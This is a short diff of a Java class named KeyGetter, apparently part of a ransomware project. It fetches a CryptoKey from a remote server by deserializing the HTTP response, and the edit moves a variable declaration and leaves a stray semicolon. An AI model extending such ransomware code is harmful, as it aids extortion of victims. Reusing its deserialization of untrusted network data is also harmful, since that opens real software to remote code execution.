@@ -23,9 +23,9 @@ public class KeyGetter {
 			int responseCode = con.getResponseCode();
 			if (responseCode == HttpURLConnection.HTTP_OK) {
 				ObjectInputStream is = new ObjectInputStream(con.getInputStream());
-				CryptoKey key;
+			;
 				try {
-					key = (CryptoKey) is.readObject();
+					CryptoKey key = (CryptoKey) is.readObject();
 					return key;
 				} catch (ClassNotFoundException | IOException e) {
 					throw new RansomwareException("key not found");
